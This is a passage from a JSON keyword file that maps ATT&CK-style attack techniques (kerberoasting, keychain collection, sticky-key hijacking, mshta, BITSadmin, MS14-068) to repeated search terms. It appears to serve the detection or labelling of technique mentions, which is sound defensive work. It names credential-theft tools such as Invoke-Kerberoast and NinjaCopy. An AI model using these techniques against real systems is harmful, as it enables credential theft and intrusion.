    ],
    "cmstp": [
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe",
        "cmstp.exe"
    ],
    "execution guardrails": [
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying",
        "environmental keying"
    ],
    "component object model hijacking": [
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence",
        "COM + hijack in same sentence"
    ],
    "accessibility features": [
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "sticky key ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        "C:\\Windows\\System32\\sethc.exe ",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe",
        " C:\\Windows\\System32\\utilman.exe"
    ],
    "keychain": [
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence",
        "collect + keychain in same sentence"
    ],
    "mshta": [
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe",
        "mshta.exe"
    ],
    "pass the ticket": [
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket",
        "pass-the-ticket"
    ],
    "kerberoasting": [
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast ",
        "Invoke-Kerberoast "
    ],
    "password policy discovery": [
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        "looks for net and account or domain in close proximity ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " net accounts ",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol",
        " Get-PassPol"
    ],
    "local job scheduling": [
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron",
        "cron"
    ],
    "windows remote management": [
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm",
        "winrm"
    ],
    "bits jobs": [
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0",
        "BITSadmin \u00a0"
    ],
    "data from information repositories": [
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember ",
        "spwebmember "
    ],
    "lc_load_dylib addition": [
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB ",
        "LC_LOAD_DYLIB "
    ],
    "histcontrol": [
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL",
        "HISTCONTROL"
    ],
    "file system logical offsets": [
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy",
        "NinjaCopy"
    ],
    "regsvcs/regasm": [
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        "regasm.exe ",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe",
        " regsvcs.exe"
    ],
    "exploitation for credential access": [
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
